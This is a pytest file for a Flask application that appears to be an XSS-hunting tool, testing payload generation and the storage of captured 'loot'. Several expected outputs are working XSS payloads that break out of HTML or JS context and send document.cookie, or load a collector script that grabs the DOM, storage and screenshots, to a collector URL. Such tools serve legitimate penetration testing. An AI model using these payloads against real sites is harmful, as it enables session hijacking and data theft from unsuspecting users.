import json

from app import db
from app.schemas import XSS
from flask.testing import FlaskClient
from freezegun import freeze_time
from tests.helpers import Helpers


class TestGenerateXssPayload:
    def test__given_html_collector__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={
                "client_id": 1,
                "url": "http://127.0.0.1",
                "xss_type": "s",
                "code_type": "html",
                "to_gather": ["dom"],
                "tags": ["tag1"],
                "custom_js": "dmFyIGEgPSA1CnZhciBiID02CmErYg==",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {
            "payload": '\'>"><script src=http://127.0.0.1/static/collector.min.js data="cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMSxkbUZ5SUdFZ1BTQTFDblpoY2lCaUlEMDJDbUVyWWc9PQ=="></script>'
        }
        assert response.status_code == 200

    def test__given_html_js_grabber__when_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": ["tag1"], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {
            "payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie)</script>'
        }

    def test__given_html_js_grabber__when_no_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": ["cookies"], "tags": [], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {
            "payload": '\'>"><script>new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie)</script>'
        }

    def test__given_html_no_js__when_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": ["tag1"], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef?tags=tag1" />'}

    def test__given_html_no_js__when_no_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "html", "to_gather": [], "tags": [], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": '\'>"><img src="http://127.0.0.1/api/x/s/abcdef" />'}

    def test__given_js_collector__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={
                "client_id": 1,
                "url": "http://127.0.0.1",
                "xss_type": "s",
                "code_type": "js",
                "to_gather": ["dom"],
                "tags": ["tag1"],
                "custom_js": "dmFyIGEgPSA1CnZhciBiID02CmErYg==",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {
            "payload": ';};var js=document.createElement("script");js.src="http://127.0.0.1/static/collector.min.js";js.setAttribute("data", "cyxhYmNkZWYsY29va2llcztmaW5nZXJwcmludDtsb2NhbF9zdG9yYWdlO29yaWdpbl91cmw7cmVmZXJyZXI7c2NyZWVuc2hvdDtzZXNzaW9uX3N0b3JhZ2UsdGFnMSxkbUZ5SUdFZ1BTQTFDblpoY2lCaUlEMDJDbUVyWWc9PQ==");document.body.appendChild(js);'
        }

    def test__given_js_js_grabber__when_js_capture_and_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": ["tag1"], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1&cookies="+encodeURIComponent(document.cookie);'}

    def test__given_js_js_grabber__when_js_capture_and_no_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": ["cookies"], "tags": [], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?cookies="+encodeURIComponent(document.cookie);'}

    def test__given_js_js_grabber__when_tags_and_no_js_capture__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": ["tag1"], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef?tags=tag1";'}

    def test__given_js_js_grabber__when_no_js_capture_and_no_tags__then_payload_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test", uid="abcdef")
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.post(
            "/api/xss/generate",
            json={"client_id": 1, "url": "http://127.0.0.1", "xss_type": "s", "code_type": "js", "to_gather": [], "tags": [], "custom_js": ""},
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.json == {"payload": ';};new Image().src="http://127.0.0.1/api/x/s/abcdef";'}


class TestGetXss:
    @freeze_time("2000-01-01")
    def test__given_request__then_xss_returned(self, client_tester: FlaskClient):
        Helpers.create_client(name="test")
        xss: XSS = Helpers.create_xss()
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.get(f"/api/xss/{xss.id}", headers={"Authorization": f"Bearer {access_token}"})
        assert response.json == {"data": {}, "headers": {}, "id": 1, "ip_addr": "127.0.0.1", "tags": [], "timestamp": 946684800}
        assert response.status_code == 200


class TestDeleteXss:
    def test__given_xss_id__then_xss_deleted(self, client_tester: FlaskClient):
        Helpers.create_client(name="test")
        xss: XSS = Helpers.create_xss()
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.delete(f"/api/xss/{xss.id}", headers={"Authorization": f"Bearer {access_token}"})
        assert db.session.execute(db.select(db.func.count()).select_from(XSS)).scalar() == 0
        assert response.json == {"msg": "XSS deleted successfully"}
        assert response.status_code == 200


class TestGetXssLoot:
    def test__given_xss_id_and_loot_type__then_loot_returned(self, client_tester: FlaskClient):
        Helpers.create_client(name="test")
        xss: XSS = Helpers.create_xss(data={"cookies": {"Cookie1": "Value1"}})
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.get(f"/api/xss/{xss.id}/data/cookies", headers={"Authorization": f"Bearer {access_token}"})
        assert response.json == {"data": {"Cookie1": "Value1"}}
        assert response.status_code == 200


class TestDeleteXssLoot:
    def test__given_xss_id_and_loot_type__then_loot_deleted(self, client_tester: FlaskClient):
        Helpers.create_client(name="test")
        xss: XSS = Helpers.create_xss(data={"cookies": {"Cookie1": "Value1"}})
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.delete(f"/api/xss/{xss.id}/data/cookies", headers={"Authorization": f"Bearer {access_token}"})
        assert xss.data == json.dumps({})
        assert response.json == {"msg": "Data deleted successfully"}
        assert response.status_code == 200


class TestGetAllXss:
    @freeze_time("2000-01-01")
    def test__given_type_and_client_id_filters__then_only_one_xss_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test")
        Helpers.create_client("test2")
        Helpers.create_xss(xss_type="stored", tags=["test"])
        Helpers.create_xss(xss_type="reflected")
        Helpers.create_xss(xss_type="reflected", client_id=2)
        Helpers.create_xss(xss_type="stored", client_id=2)
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.get("/api/xss?client_id=1&type=stored", headers={"Authorization": f"Bearer {access_token}"})
        assert response.json == [{"id": 1, "ip_addr": "127.0.0.1", "tags": ["test"], "timestamp": 946684800}]
        assert response.status_code == 200


class TestGetAllXssLoot:
    def test__given_client_id_filter__then_only_one_loot_returned(self, client_tester: FlaskClient):
        Helpers.create_client("test")
        Helpers.create_client("test2")
        Helpers.create_xss(xss_type="stored", data={"cookies": {"Cookie1": "Value1"}})
        Helpers.create_xss(xss_type="reflected", client_id=2, data={"local_storage": {"Key1": "Value1"}})
        access_token, refresh_token = Helpers.login(client_tester, "admin", "xss")
        response = client_tester.get("/api/xss/data?client_id=1", headers={"Authorization": f"Bearer {access_token}"})
        assert response.json == [
            {"data": {"cookies": {"Cookie1": "Value1"}}, "tags": [], "xss_id": 1},
        ]
        assert response.status_code == 200
